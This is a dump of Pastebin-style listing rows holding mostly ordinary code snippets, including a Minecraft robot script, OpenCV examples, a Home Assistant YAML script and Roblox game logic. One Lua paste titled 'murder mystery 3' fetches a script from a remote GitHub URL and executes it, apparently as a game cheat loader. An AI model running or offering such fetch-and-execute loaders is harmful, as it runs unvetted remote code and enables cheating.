    ""mobile"": 35,
    ""hosting"": 127,
    ""hosting & proxy"": 9,
    ""proxy"": 3
  }
}"
j4nmhVVD,expired.xml,jackkkkkk,XML,Monday 3rd of July 2023 06:40:52 PM CDT,"<?xml version=""1.0"" encoding=""utf-8""?>
Expired=""0x25F7156822BCA245DECAB42"""
QiNKtpua,murder mystery 3,8Irelyn,Lua,Monday 3rd of July 2023 06:27:41 PM CDT,"loadstring(game:HttpGet(""https://raw.githubusercontent.com/8Irelyn/loadstrings/main/murdermystery3""),true)()"
YXuXYe5i,MC:OC minibot,copperTones,Lua,Monday 3rd of July 2023 06:05:49 PM CDT,"--[[
Minecraft: Compact Claustrophobia: OpenComputers
poopbot:
crafting
dropping

minibot:
arbitrary block placing
Inventory Controller

chembot:
]]
local component = require(""component"")
local sides = require(""sides"")
local robot = component.robot
local inventory = component.inventory_controller

--pos = {x=0, y=0, z=0, d=0}
inv = {
	obsidian=1,
	redstone_block=2,
	redstone_dust=3
}

prog = {}
--[[
todo:
--chkinv
suck
charge
select
]]
function prog.run()
	--if prog.chkinv(prog.inv(), ""obsidian"", 26, ""redstone_block"", ""redstone_dust"") then
	prog.mmove(""front"", 3, ""right"", ""front"")
	prog.suck(""down"")
	prog.mmove(""left"", ""front"", ""right"")
	prog.pillarup()
	prog.pillar()
	prog.move(""left"")
	prog.pillar()
	prog.move(""left"")
	prog.pillar()
	prog.pillar(true)
	prog.move(""right"")
	prog.pillar()
	prog.move(""right"")
	prog.pillar()
	prog.pillar()
	prog.move(""left"")
	prog.pillar()
	prog.move(""back"")
	prog.drop(""redstone_dust"")
	os.sleep(10)
	prog.charge()
end

function prog.pillarup()
	prog.place(""front"")
	prog.move(""up"")
	prog.place(""front"")
	prog.move(""up"")
	prog.place(""front"")
	prog.move(""down"")
end

function prog.pillar(core)
	prog.place(""up"")
	prog.place(""down"")
	prog.move(""back"")
	if core then
		prog.place(""front"", ""redstone_block"")
		prog.select(""obsidian"")
	else
		prog.place(""front"")
	end
end

function prog.inv()
	local inv = {}
	for i=1,16 do
		i = inventory.getStackInInternalSlot(i)
		
	end
end

function prog.chkinv(name, count, ...)
	local tmp = count
	if type(count) == ""string"" then
		count = 1
	end
	for i
end

function prog.select(name)
	robot.select(inv[name])
end

function prog.drop(dir, name, count)
	prog.select(name)
	robot.drop(dir, count)
end

function prog.place(dir, name, sneak)
	if name then
		prog.select(name)
	end
	robot.place(sides[dir], sneak)
end

function prog.mmove(dir, n, ...)
	if type(n) == ""number"" then
		for i=1,n do
			prog.move(dir)
		end
		prog.mmove(...)
	elseif type(dir) == ""string"" then
		prog.move(dir)
		prog.mmove(n, ...)
	end
end

function prog.move(dir)
	dir = sides[dir]
	if dir > 3 then
		robot.turn(dir == 4)
	else
		robot.move(dir)
	end
end"
6XFZZTgi,Untitled,Krystal_Amaia,C#,Monday 3rd of July 2023 05:24:03 PM CDT,"using System;
using System.Collections.Generic;
using System.Threading;

class Note {
    public int Frequency { get; set; }
    public int Duration { get; set; }

    public Note(int frequency, int duration) {
        Frequency = frequency;
        Duration = duration;
    }
}

class Program {
    static void Main(string[] args) {
        // Chorus notes and durations
        Console.ReadKey();
        List<Note> chorus = new List<Note>()
        {
            new Note( 392, 60 ),
            new Note( 440, 60 ),
            new Note(523, 60  ),
            new Note(440, 60  ),
            new Note(659, 120  ),
            new Note(659, 60  ),
            new Note(587,240 ),

            new Note( 392, 60 ),
            new Note( 440, 60 ),
            new Note(523, 60  ),
            new Note(440, 60  ),
            new Note(587, 120),
            new Note(587, 60),
            new Note(523, 120),

            new Note(494, 60),
            new Note(440, 60)
            

        };

        // Tempo (in beats per minute)
        int bpm = 120;

        // Calculate delay between notes based on tempo
        int delay = (int)((60.0 / bpm) * 1000);

        // Play the entire chorus with the correct tempo
        for (int i = 0; i < 2; i++)  // Repeat the chorus twice
        {
            foreach (var note in chorus) {
                Console.Beep(note.Frequency, (int)note.Duration *2 );
                Thread.Sleep(delay / 2);    
            }
            Thread.Sleep(delay);
        }
    }
}"
72MHkHqy,norm,NIKOLAY_TETUS,C++,Monday 3rd of July 2023 05:13:16 PM CDT,"import cv2
import numpy as np


def detect_book_boundaries(image_path):
    # Загрузка изображения
    image = cv2.imread(image_path)
    
    # Преобразование изображения в оттенки серого
    gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
    
    # Применение размытия для уменьшения шума
    blurred = cv2.GaussianBlur(gray, (11, 11), 2)
    
    # Применение оператора Кэнни для обнаружения границ
    edges = cv2.Canny(blurred, 50, 150)
    
    # Применение дилатации для закрытия пробелов между границами
    dilated = cv2.dilate(edges, None, iterations=1)
    
    # Поиск контуров на изображении
    contours, _ = cv2.findContours(dilated.copy(), cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
    
    # Инициализация списка для хранения координат границ книг
    book_boundaries = []
    
    # Обход всех контуров и добавление границ в список
    for contour in contours:
        # Игнорирование маленьких контуров
        if cv2.contourArea(contour) > 4500:
            # Получение ограничивающего прямоугольника для контура
            x, y, w, h = cv2.boundingRect(contour)
            _, image_w, _ = image.shape
            if w <= image_w * 0.85:
                # Добавление границы книги в список
                book_boundaries.append((x, y, x + w, y + h))
    
    # Создание нового изображения с отмеченными границами книг
    marked_image = image.copy()
    for boundary in book_boundaries:
        x1, y1, x2, y2 = boundary
        cv2.rectangle(marked_image, (x1, y1), (x2, y2), (0, 255, 0), 2)
    
    # Сохранение изображения с отмеченными границами книг
    marked_image_path = 'marked_image.jpg'
    cv2.imwrite(marked_image_path, marked_image)
    
    # Возвращение списка границ книг и пути к сохраненному изображению
    return book_boundaries, marked_image_path

# Пример использования функции для распознавания границ книг на изображении
image_path = 'image.jpg'
boundaries, marked_image_path = detect_book_boundaries(image_path)


# Вывод координат границ книг
for boundary in boundaries:
    print(f""Книга: {boundary}"")

# Вывод пути к сохраненному изображению
print(""Сохраненное изображение:"", marked_image_path)"
ARNxK8s8,Untitled,NIKOLAY_TETUS,C++,Monday 3rd of July 2023 04:50:17 PM CDT,"import cv2
import numpy as np


def detect_book_boundaries(image_path):
    # Загрузка изображения
    image = cv2.imread(image_path)
    
    # Преобразование изображения в оттенки серого
    gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
    
    # Применение размытия для уменьшения шума
    blurred = cv2.GaussianBlur(gray, (9, 9), 1)
    
    # Применение оператора Кэнни для обнаружения границ
    edges = cv2.Canny(blurred, 50, 150)
    
    # Применение дилатации для закрытия пробелов между границами
    dilated = cv2.dilate(edges, None, iterations=1)
    
    # Поиск контуров на изображении
    contours, _ = cv2.findContours(dilated.copy(), cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
    
    # Инициализация списка для хранения координат границ книг
    book_boundaries = []
    
    # Обход всех контуров и добавление границ в список
    for contour in contours:
        # Игнорирование маленьких контуров
        if cv2.contourArea(contour) > 4500:
            # Получение ограничивающего прямоугольника для контура
            x, y, w, h = cv2.boundingRect(contour)
            _, image_w, _ = image.shape
            if w <= image_w * 0.85:
                # Добавление границы книги в список
                book_boundaries.append((x, y, x + w, y + h))
    
    # Создание нового изображения с отмеченными границами книг
    marked_image = image.copy()
    for boundary in book_boundaries:
        x1, y1, x2, y2 = boundary
        cv2.rectangle(marked_image, (x1, y1), (x2, y2), (0, 255, 0), 2)
    
    # Сохранение изображения с отмеченными границами книг
    marked_image_path = 'marked_image.jpg'
    cv2.imwrite(marked_image_path, marked_image)
    
    # Возвращение списка границ книг и пути к сохраненному изображению
    return book_boundaries, marked_image_path

# Пример использования функции для распознавания границ книг на изображении
image_path = 'aaa.jpg'
boundaries, marked_image_path = detect_book_boundaries(image_path)


# Вывод координат границ книг
for boundary in boundaries:
    print(f""Книга: {boundary}"")

# Вывод пути к сохраненному изображению
print(""Сохраненное изображение:"", marked_image_path)"
Uevbd47Z,motyle 2,314ma,YAML,Monday 3rd of July 2023 04:10:17 PM CDT,"motyle_oswietlenie:
  alias: Motyle - Oświetlenie
  fields:
    start:
      name: Początek
      description: Czas rozpoczęcia ściemniania/rozjaśniania (czas dla którego ma być 100/0%)
      required: true
      example: ""17:30""
      default: ""17:30""
      selector:
        time:
    end:
      name: Koniec
      description: Czas zakończenia ściemniania/rozjaśniania (czas dla którego ma być 0/100%)
      required: true
      example: ""19:10""
      default: ""19:10""
      selector:
        time:
    light:
      name: Światło
      description: Światło do sterowania
      required: true
      example: light.motyle_oswietlenie
      default: light.motyle_oswietlenie
      selector:
        entity:
          domain: light
    mode:
      name: Tryb
      description: Tryb działania skryptu
      required: true
      example: darken
      default: darken
      selector:
        select:
          options:
            - label: Przyciemnianie
              value: darken
            - label: Rozjaśnianie
              value: lighten
    months:
      name: Miesiące
      description: Miesiące w których ma działać skrypt
      required: true
      example: ""[1, 2, 3, 4, 9, 10, 11, 12]""
      default: ""[1, 2, 3, 4, 9, 10, 11, 12]""
      selector:
        select:
          multiple: true
          mode: list
          options:
            - label: Styczeń
              value: ""1""
            - label: Luty
              value: ""2""
            - label: Marzec
              value: ""3""
            - label: Kwiecień
              value: ""4""
            - label: Maj
              value: ""5""
            - label: Czerwiec
              value: ""6""
            - label: Lipiec
              value: ""7""
            - label: Sierpień
              value: ""8""
            - label: Wrzesień
              value: ""9""
            - label: Październik
              value: ""10""
            - label: Listopad
              value: ""11""
            - label: Grudzień
              value: ""12""
  sequence:
    - variables:
        start_int: ""{{ start.split(':')[0] | int * 60 + start.split(':')[1] | int }}""
        end_int: ""{{ end.split(':')[0] | int * 60 + end.split(':')[1] | int }}""
        time_int: ""{{ now().hour * 60 + now().minute }}""
        start_value: ""{{ (mode != 'darken') | iif(0, 100) }}""
        end_value: ""{{ (mode != 'darken') | iif(100, 0) }}""
        current_value: ""{{ start_value + ((time_int - start_int) / (end_int - start_int)) * (end_value - start_value) }}""
    - if:
        - condition: template
          value_template: ""{{ start_int <= time_int <= end_int }}""
        - condition: template
          value_template: ""{{ now().month | string in months }}""
      then:
        - service: light.turn_on
          data:
            transition: 5
            brightness_pct: ""{{ min(max(current_value | float, 0), 100) }}""
            kelvin: 6500
          target:
            entity_id: ""{{ light }}""
"
qk8sHuLk,Обучение без учителя. Тема 2. Кластеризация Урок 9. Поиск структуры в данных Задача №3,MacClane,Python,Monday 3rd of July 2023 04:04:47 PM CDT,"import pandas as pd
from sklearn.cluster import KMeans
import seaborn as sns
 
data_full = pd.read_csv('/datasets/cars_label.csv')
 
data = data_full.drop(columns=['brand'])
 
# Обучение модели
model = KMeans(n_clusters=3, random_state=12345)
model.fit(data)
 
centroids = pd.DataFrame(model.cluster_centers_, columns=data.columns)
data_full = pd.concat([data_full], ignore_index=True)
 
# Построение графика
pairgrid = sns.pairplot(data_full, hue='brand', diag_kind='hist')
centroids['brand'] = 4
pairgrid.data = centroids
pairgrid.map_offdiag(func=sns.scatterplot, s=200, marker='*', palette='flag')"
Gyk36BHV,Untitled,NIKOLAY_TETUS,C++,Monday 3rd of July 2023 04:01:41 PM CDT,"import cv2
import numpy as np

def detect_book_boundaries(image_path):
    # Загрузка изображения
    image = cv2.imread(image_path)
    
    # Преобразование изображения в оттенки серого
    gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
    
    # Применение размытия для уменьшения шума
    blurred = cv2.GaussianBlur(gray, (5, 5), 0)
    
    # Применение оператора Кэнни для обнаружения границ
    edges = cv2.Canny(blurred, 50, 150)
    
    # Применение дилатации для закрытия пробелов между границами
    dilated = cv2.dilate(edges, None, iterations=2)
    
    # Поиск контуров на изображении
    contours, _ = cv2.findContours(dilated.copy(), cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
    
    # Инициализация списка для хранения координат границ книг
    book_boundaries = []
    
    # Обход всех контуров и добавление границ в список
    for contour in contours:
        # Игнорирование маленьких контуров
        if cv2.contourArea(contour) > 1000:
            # Получение ограничивающего прямоугольника для контура
            x, y, w, h = cv2.boundingRect(contour)
            
            # Добавление границы книги в список
            book_boundaries.append((x, y, x + w, y + h))
    
    # Создание нового изображения с отмеченными границами книг
    marked_image = image.copy()
    for boundary in book_boundaries:
        x1, y1, x2, y2 = boundary
        cv2.rectangle(marked_image, (x1, y1), (x2, y2), (0, 255, 0), 2)
    
    # Возвращение списка границ книг и нового изображения
    return book_boundaries, marked_image

# Пример использования функции для распознавания границ книг на изображении
image_path = 'image.jpg'
boundaries, marked_image = detect_book_boundaries(image_path)

# Вывод координат границ книг
for boundary in boundaries:
    print(f""Книга: {boundary}"")

# Отображение нового изображения с отмеченными границами книг
cv2.imshow(""Marked Image"", marked_image)
cv2.waitKey(0)
cv2.destroyAllWindows()"
pJtSUYQD,Barebones Toyhou.se HTML,plutii,HTML,Monday 3rd of July 2023 03:31:46 PM CDT,"<table align=""center"" style=""table-layout: fixed; width: 70%; border: 1px solid rgba(0,0,0,.125); border-radius: 0.25rem; background: #f7f7f7; padding: 10px; color: #212529;"">
  <tbody>
    <tr>
      <td style=""width: 30%; border-right: 1px solid rgba(0,0,0,.125); padding: 5px;"">
        <table style=""text-align: center; border: none; margin: auto; line-height: 1rem;"">
          <tbody>
            <tr style=""vertical-align: top;""><td style=""text-align: right;""><strong>name(s):</strong></td><td style=""text-align: left;"">--</td></tr>
            <tr style=""vertical-align: top;""><td style=""text-align: right;""><strong>pronouns:</strong></td><td style=""text-align: left;"">--</td></tr>
            <tr style=""vertical-align: top;""><td style=""text-align: right;""><strong>age:</strong></td><td style=""text-align: left;"">--</td></tr>
            <tr style=""vertical-align: top;""><td style=""text-align: right;""><strong>date of birth:</strong></td><td style=""text-align: left;"">--</td></tr>
            <tr style=""vertical-align: top;""><td style=""text-align: right;""><strong>height/weight:</strong></td><td style=""text-align: left;"">--</td></tr>
            <tr style=""vertical-align: top;""><td style=""text-align: right;""><strong>occupation:</strong></td><td style=""text-align: left;"">--</td></tr>
          </tbody>
        </table>
      </td>
      <td style=""width: 70%; vertical-align: top; height: 300px;"">
        <div style=""height: 100%; width: 100%; max-height: 100%; overflow-y: auto; padding: 10px 30px;"">
          <h2><em>personality</em></h2>
          <div style=""padding: 0px 20px;"">
            <p>lorem ipsum</p>
          </div>
          <hr style=""border-top-color: rgba(0,0,0,.1);"">
          <h2><em>backstory</em></h2>
          <div style=""padding: 0px 20px;"">
            <p>lorem ipsum</p>
          </div>
          <hr style=""border-top-color: rgba(0,0,0,.1);"">
            <div style=""float: left; width:50%; border-right: 1px solid rgba(0,0,0,.125); padding-right: 10px;"">
              <h2><em>likes</em></h2>
              <ul>
                <li>one</li>
                <li>two</li>
                <li>three</li>
              </ul>
            </div>
            <div style=""width: 50%; padding-left: 10px; float: right;"">
              <h2><em>dislikes</em></h2>
              <ul>
                <li>one</li>
                <li>two</li>
                <li>three</li>
              </ul>
            </div>
          <hr style=""border-top-color: rgba(0,0,0,.1); margin-top:20px;"">
          <h2><em>trivia</em></h2>
          <div style=""padding: 0px 20px;"">
            <p>lorem ipsum</p>
          </div>
        </div>
      </td>
    </tr>
    <tr><td colspan=""2"" style=""text-align: right; font-size: 11px; background: rgba(0,0,0,.125); padding: 2px"">HTML by <a href=""https://toyhou.se/purrluto"">purrluto</a></td></tr>
  </tbody>
</table>"
wQJushdj,Untitled,DenisTalalaev,C++,Monday 3rd of July 2023 03:21:53 PM CDT,"
	   void SaveScreenshot(const std::wstring& filePath)
	   {
		   // Инициализация библиотеки GDI+
		   ULONG_PTR gdiplusToken;
		   Gdiplus::GdiplusStartupInput gdiplusStartupInput;
		   Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

		   // Получение размеров экрана
		   int screenWidth = GetSystemMetrics(SM_CXSCREEN);
		   int screenHeight = GetSystemMetrics(SM_CYSCREEN);

		   // Создание контекста устройства для скриншота
		   HDC screenDC = GetDC(nullptr);
		   HDC memDC = CreateCompatibleDC(screenDC);
		   HBITMAP screenshot = CreateCompatibleBitmap(screenDC, screenWidth, screenHeight);
		   SelectObject(memDC, screenshot);

		   // Копирование содержимого экрана в контекст устройства для скриншота
		   BitBlt(memDC, 0, 0, screenWidth, screenHeight, screenDC, 0, 0, SRCCOPY);

		   // Сохранение скриншота в файл
		   Gdiplus::Bitmap bitmap(screenshot, nullptr);
		   CLSID clsid;
		   GetEncoderClsid(L""image/jpeg"", &clsid);  // Замените ""image/jpeg"" на нужный вам формат изображения (например, ""image/png"")

		   bitmap.Save(filePath.c_str(), &clsid, nullptr);

		   // Освобождение ресурсов
		   DeleteObject(screenshot);
		   DeleteDC(memDC);
		   ReleaseDC(nullptr, screenDC);
		   Gdiplus::GdiplusShutdown(gdiplusToken);
	   }

	   // Функция для получения CLSID кодека для указанного формата изображения
	   int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
	   {
		   UINT num = 0;  // Количество кодеков изображений
		   UINT size = 0; // Размер памяти, необходимый для хранения информации о кодеках

		   // Получение размера памяти, необходимого для хранения информации о кодеках
		   Gdiplus::GetImageEncodersSize(&num, &size);
		   if (size == 0)
			   return -1; // Ошибка

		   // Выделение памяти для хранения информации о кодеках
		   Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
		   if (pImageCodecInfo == nullptr)
			   return -1; // Ошибка

		   // Получение информации о кодеках
		   Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);

		   // Поиск кодека с указанным форматом
		   for (UINT j = 0; j < num; ++j)
		   {
			   if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
			   {
				   *pClsid = pImageCodecInfo[j].Clsid;
				   free(pImageCodecInfo);
				   return j; // Успешно
			   }
		   }

		   free(pImageCodecInfo);
		   return -1; // Кодек не найден
	   }

	   std::string GetCurrentDateTime()
	   {
		   std::chrono::system_clock::time_point now = std::chrono::system_clock::now();
		   std::time_t nowTime = std::chrono::system_clock::to_time_t(now);
		   std::tm* nowTm = std::localtime(&nowTime);

		   char buffer[20];
		   std::strftime(buffer, sizeof(buffer), ""%Y-%m-%d_%H-%M-%S"", nowTm);

		   return buffer;
	   }




private: System::Void button3_Click(System::Object^ sender, System::EventArgs^ e) {
	std::wstring filePath = L""screenshots/screen_"" + std::wstring(GetCurrentDateTime().begin(), GetCurrentDateTime().end()) + L"".jpg"";
	SaveScreenshot(filePath);

}"
H42bBTNm,anjani deployed,Nicky-Lalrochhara,Python,Monday 3rd of July 2023 02:59:07 PM CDT,"await anjani.run()
  File ""/home/ubuntu/.local/lib/python3.10/site-packages/anjani/core/telegram_bot.py"", line 261, in run
    await self.stop()
  File ""/home/ubuntu/.local/lib/python3.10/site-packages/anjani/core/anjani_bot.py"", line 75, in stop
    await self.dispatch_event(""stop"")
  File ""/home/ubuntu/.local/lib/python3.10/site-packages/anjani/core/event_dispatcher.py"", line 198, in dispatch_event
    await self.dispatch_alert(
  File ""/home/ubuntu/.local/lib/python3.10/site-packages/anjani/core/event_dispatcher.py"", line 352, in dispatch_alert
    await self.client.send_message(
  File ""/home/ubuntu/.local/lib/python3.10/site-packages/pyrogram/methods/messages/send_message.py"", line 133, in send_message
    peer=await self.resolve_peer(chat_id),
  File ""/home/ubuntu/.local/lib/python3.10/site-packages/pyrogram/methods/advanced/resolve_peer.py"", line 59, in resolve_peer
    raise ConnectionError(""Client has not been started yet"")
ConnectionError: Client has not been started yet
  ERROR     |  asyncio          |  Unclosed client session
client_session: <aiohttp.client.ClientSession object at 0x7f4e01dc6950>
"
EN3tmEsU,hiddendevs_example,ArtisticCloud,Lua,Monday 3rd of July 2023 02:54:35 PM CDT,"local Ring = {} 

Ring.Rings = {} ;
Ring.GetRing = function( RingName )
	for _,RingMeta in Ring.Rings do
		if RingMeta.Name == RingName then
			return RingMeta ; 
		end
	end ; 
end ; 

local Storage = game:GetService( 'ReplicatedStorage' ) ;
local Http = game:GetService( 'HttpService' ) ; 

local Remotes = Storage:WaitForChild( 'Remotes' ) ; 
local GameRemotes = Remotes:WaitForChild( 'Game.Remotes' ) ;

local ClientAction = GameRemotes:WaitForChild( 'Client.Action' ) ; 

function Ring.new( Model , PlayerSize , RingType )
	local self = setmetatable({},{
		__index = function( Table , Index , Value )
			--// Attempt to reference the teams //--
			if Index == 'Team1' or Index == 'Team2' then
				return Table.Teams[Index] ; 
			end ; 
			--// Attempt to reference the model attributes //--
			if not Ring[Index] and Table.Model:GetAttribute( Index) ~= nil then
				return Table.Model:GetAttribute( Index ) ; 
				--// Attempt to reference model propertiesl //--
			elseif not Ring[Index] and Table.Model[Index] ~= nil then
				return Table.Model[Index] ;
			end ; 
			--// Default to the ring class //--
			return Ring[Index] ; 
		end,	
	}) ; 

	self.Model = Model ; 

	self.Teams = {Team1={},Team2={}} ; 
	self.PlayerSize = PlayerSize ; 
	self.RingType = '' ; 

	self.MatchConnections = {} ; 

	--// Setup the ring //--
	self:_SetupRing() ; 
	task.spawn(function()
		self:_StartLoop() ; 
	end) ; 

	table.insert( Ring.Rings , self ) ; 
	return self ; 
end ; 

function Ring:_SetupRing()
	--// Load player attributes //--
	for Attribute , Value in _G.ServerGameSettings._RingAttributes do
		self.Model:SetAttribute( Attribute , Value )
	end ; 

	--// Prompt part //--
	local NewPrompt = script:WaitForChild( 'Join.Prompt' ):Clone() ; 
	NewPrompt.Parent = self.Model:FindFirstChild( 'Prompt.Part' , true ) ; 

	--// Ring Connections //--
	NewPrompt.Triggered:Connect(function( Player )
		self:_AttemptToJoin( Player ) ; 
	end) ; 
	self.Model:GetAttributeChangedSignal( 'InGame' ):Connect(function()
		NewPrompt.Enabled = not self.InGame ; 
		if self.InGame == true then
			self:_PreGameLoop() ; 
		end ; 
		while self.InGame == true do task.wait()
			self:_BeginGameLoop() ; 
		end ; 
	end) ; 

	self:_SetAttribute( 'MovesEnabled' , Http:JSONEncode({
		'Left','Right','Up','Down'	
	}) ) ; 
end ; 

function Ring:_SetAttribute( Attribute , Value )
	self.Model:SetAttribute( Attribute , Value ) ; 
end ; 

function Ring:_AttemptToLeave( Player , Team )
	--// Get the player team from the name of the ring //--
	local TeamTable , TeamName = _G.GameFunctions.GetPlayerTeam( Player , self.Name ) ;
	if TeamTable ~= nil then
		local SpotPad = self.Model:FindFirstChild( TeamName .. 'Spot' , true )
		--// Remove Player from ring //--
		_G.GameFunctions.Teleport( Player ,  SpotPad.CFrame * CFrame.new(0,-1,11.5) ) ;
		table.remove( TeamTable , table.find( TeamTable , Player )) ; 
	end ; 
end ;

function Ring:ForEachPlayer( Data , Callback ) 
	local Callback = type(Data) == 'function' and Data or Callback ; 
	for Team,Players in self.Teams do
		for _,Player in Players do
			if Player == nil or Player.Parent == nil then
				continue ; 
			end ; 
			--// if a specific team was mentioned then make sure the player is on that team before calling the callback //--
			if type(Data) == 'table' and Data.Team ~= nil and self:IsOnTeam( Player , Data.Team ) == nil then
				continue ; 
			end ; 
			Callback( Player , Team , _G.GameFunctions.GetPlayerConfig(Player) ) ; 
		end ; 
		continue ;
	end ; 
end ;

function Ring:IsOnTeam( Player , Team )
	return  (type(Team) == 'table' and table.find( Team , Player )) or 
		(type(Team) == 'string' and table.find( self[Team]  , Player )) ; 
end ; 

function Ring:_AttemptToJoin( Player )
	local Team ; 
	--// Make sure the player isnt in a game and player isnt on anther ring //--
	if Player:GetAttribute( 'InGame' ) == true and _G.GameFunctions.GetRing( Player ) ~= self.Model then
		return ; 
		--// If they are already on the ring, then make sure to leave it by setting onring to nothing //--
	elseif Player:GetAttribute( 'InGame' ) == false and _G.GameFunctions.GetRing( Player ) == self.Model then
		_G.GameFunctions.SetRing( Player , nil ) ; 
		return ; 
	end ; 
	if self:IsOnTeam( Player , Team ) == false and #self.Team1 < self.PlayerSize then
		Team = 'Team1' 
	elseif self:IsOnTeam( Player , Team ) == false and #self.Team2  < self.PlayerSize then
		Team = 'Team2' ; 
	end ; 
	--// Join the team and setup the player //--
	if Team ~= nil and Player.Character ~= nil then
		table.insert( self[Team] , Player ) ; 
		_G.GameFunctions.SetRing( Player , self.Model ) ;
		
		--// find the pad and teleport to it //--
		_G.GameFunctions.Stun( Player , true ) ;
		local SpotPad = self.Model:FindFirstChild( Team .. 'Spot' , true ) ; 
		_G.GameFunctions.Teleport( Player ,  CFrame.new( SpotPad.Position , SpotPad.Position + SpotPad.CFrame.LookVector * 2 ) )
		
		--// Wait until the player isnt on the ring anymore or they are unable to leave and teleport them away //--
		repeat task.wait(0.1) until (Player.Parent == nil) or _G.GameFunctions.GetRing( Player ) ~= self.Model or (self.InGame == true) ;
		--// also makes sure that the game isnt going on //--
		if Player.Parent ~= nil and _G.GameFunctions.GetRing( Player ) ~= self.Model and self.InGame == false then 
			self:_AttemptToLeave( Player ) ;
			_G.GameFunctions.Stun( Player , false ) ;
		end ; 	
	end ; 
end ; 

function Ring:_CanGameContinue()
	--// Validate Players //--
	local PlayersAreValid = true ; 
	for Team,Players in self.Teams do
		for _,Player in Players do
			if Player == nil or Player.Parent == nil or _G.GameFunctions.GetRing( Player ) ~= self.Model or Player:GetAttribute( 'InGame' ) == false then
				PlayersAreValid = false ; 
				break ; 
			end ; 
			continue ; 
		end ; 
	end ; 
	--// Include the extra checks //--
	return (self.InGame == true) and (#self.Team1 == self.PlayerSize) and (#self.Team2 == self.PlayerSize) and (PlayersAreValid == true) ;  
end ; 

function Ring:_StartLoop()
	local function CanStart()
		return self.InGame == false and #self.Team1 == self.PlayerSize and #self.Team2 == self.PlayerSize ; 
	end ; 
	while getmetatable(self) do task.wait(1)
		if CanStart() == true then
			local CurrentTime = tick() ; 
			repeat task.wait() until CanStart() == false or tick() - CurrentTime >= _G.ServerGameSettings.DelayStart ;
			if CanStart() == true then
				self:_SetAttribute( 'StartTime' , tick() ) ; 
				self:_SetAttribute( 'InGame' , true ) ;
				repeat task.wait() until self.InGame == false ; 
				task.wait(1) ; 
			end ; 
		end ;
		continue ; 
	end ; 
	return ;
end ; 

function Ring:_PreGameLoop()
	local function CreatePlayerConfig( Player , Team )
		local PlayerConfigs = self.Model:FindFirstChild( 'Player.Configs' ) ;
		if PlayerConfigs and PlayerConfigs:FindFirstChild( Player.Name ) == nil then
			--// creates a config that keeps track of the player match data //--
			local PlayerConfig = script:FindFirstChild( 'Player.Game.Config.Template' ):Clone() ; 
			PlayerConfig.Name = Player.Name ; 
			--// Setup play config before giving it to the folder //--
			PlayerConfig:SetAttribute( 'Team' , Team ) ; 
			PlayerConfig:SetAttribute( 'Combo' , Http:JSONEncode({}) ) ; 
			PlayerConfig:SetAttribute( 'MovesEnabled' , Http:JSONEncode({
				'Left','Right','Up','Down' 
			}))
			PlayerConfig.Parent = PlayerConfigs ; 
		end ; 
	end ; 
	self:ForEachPlayer(function( Player , Team )
		CreatePlayerConfig( Player , Team ) ; 
		Player:SetAttribute( 'InGame' , true ) ; 
	end) ;
	--// Set Attacker and defender //--
	self:_SetAttribute( 'Attacking' , 'Team1' ) ; 
	self:_SetAttribute( 'Defending' , 'Team2' ) ; 
end ; 

function Ring:_SwitchTeamTypes()
	self:_SetAttribute( 'Attacking' , (self.Attacking == 'Team1') and 'Team2' or 'Team1') ; 
	self:_SetAttribute( 'Defending' , (self.Defending == 'Team2') and 'Team1' or 'Team2')  ; 
end ; 

function Ring:_PlayFinisher( Player , Loser )
	local Finisher = 'Hadouken' ; 
	if _G.Finishers[Finisher] then
		_G.Finishers[Finisher]( Player , Loser ) ; 
	end ; 
end ; 

function Ring:_AttemptToSave( Player )
	task.spawn(function()
		_G.PlayerDataController.SavePlayerData( Player ) ; 
	end) ; 
end ; 
	
function Ring:_EndGame( UseData )
	task.wait(0.2) ; 
	local MatchDuration = tick() - self.StartTime ; 
	local LosingTeam 
	if UseData.Winner ~= nil and UseData.Loser == nil then
		_G.PlayerFunctions.ChangeRecord( UseData.Winner , {Wins=1} ) ; 
	end ; 
	if UseData.Winner ~= nil and UseData.Loser ~= nil then	
		--// yields the function //--
		self:_PlayFinisher( UseData.Winner , UseData.Loser ) ;
		_G.PlayerFunctions.ChangeRecord( UseData.Winner , {Wins=1} ) ; 
		_G.PlayerFunctions.ChangeRecord( UseData.Loser , {Losses=1}) ; 
		--// Save player data //--
		self:_AttemptToSave(UseData.Winner) ; self:_AttemptToSave(UseData.Loser)
		task.wait(0.25) ; 
	end ; 
	self:ForEachPlayer(function( Player , Team , PlayerConfig )
		if PlayerConfig ~= nil then
			PlayerConfig:Destroy() ; 
		end ; 
		Player:SetAttribute( 'InGame' , false ) ;
		_G.GameFunctions.SetRing( Player , nil ) ;  
		local SpotPart = self.Model.TPParts[Team..'Spot'] ; 
		--// Remove the player from the ring //--
		_G.GameFunctions.Teleport( Player , SpotPart.CFrame * CFrame.new(0,-1,11.5) ) ; 
		_G.GameFunctions.Stun( Player , false ) ; 
		_G.GameFunctions.StopAnimations( Player ) ; 
		--// Send rewards to client //--
		local MatchData = {
			MatchDuration = MatchDuration ,  
			Combos = PlayerConfig:GetAttribute( 'TotalCombos' ) ,
			Dodges = PlayerConfig:GetAttribute( 'Dodges' ) ,
			HeartsLost = PlayerConfig:GetAttribute( 'HeartsLost' ) ,
		}
		local CalculatedRewards = _G.PlayerFunctions.CaculateMatchRewards( Player , MatchData )
		_G.PlayerFunctions.ApplyRewards( CalculatedRewards ) ; 
		
		local CurrentRank , CurrentRankLevel , CurrentExp , MaxExp = _G.ServerGameSettings._GetRankInfo( Player:FindFirstChild( 'Player.Data' ) )
		--// Determine the next rank through the current rank //--
		local NextRank
		for i=1,#_G.GameInfo.Ranks do
			if _G.GameInfo.Ranks[i] == CurrentRank then
				NextRank = _G.GameInfo.Ranks[i+1] or _G.GameInfo.Ranks[i] ; break
			end ; 
		end ; 
		local CurrentPlayerRankData = {
			CurrentRank = CurrentRank , 
			NextRank = NextRank or 'Bronze' ,
			RankLevel = CurrentRankLevel , 
			MaxExp = MaxExp , 
		}
